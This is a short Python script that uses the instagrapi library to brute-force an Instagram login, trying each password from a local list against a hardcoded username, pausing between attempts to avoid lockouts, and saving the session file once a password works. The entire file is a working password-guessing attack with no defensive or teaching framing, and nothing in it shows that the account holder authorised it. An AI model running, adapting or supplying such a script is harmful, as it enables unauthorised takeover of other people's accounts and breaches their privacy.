from instagrapi import Client
from instagrapi.exceptions import BadPassword, ChallengeRequired, LoginRequired
import time

USERNAME = "selimmerzgui2"

with open("password_list.txt","r") as f:
    PASSWORDS = [i for i in f]

cl = Client()
cl.set_locale("en_US") 

for password in PASSWORDS:
    try:
        print(f"Trying password: {password}")
        cl.login(USERNAME, password)
        print(f" SUCCESS: Logged in with password: {password}")

        
        cl.dump_settings("insta_session.json")
        break

    except BadPassword:
        print(f"Wrong password")
    except ChallengeRequired:
        print(f"Instagram wants you to verify via app or phone")
        break
    except LoginRequired:
        print(f" Login required again — session probably invalid.")
    except Exception as e:
        print(f" Some other bullshit happened: {e}")

    time.sleep(5) 
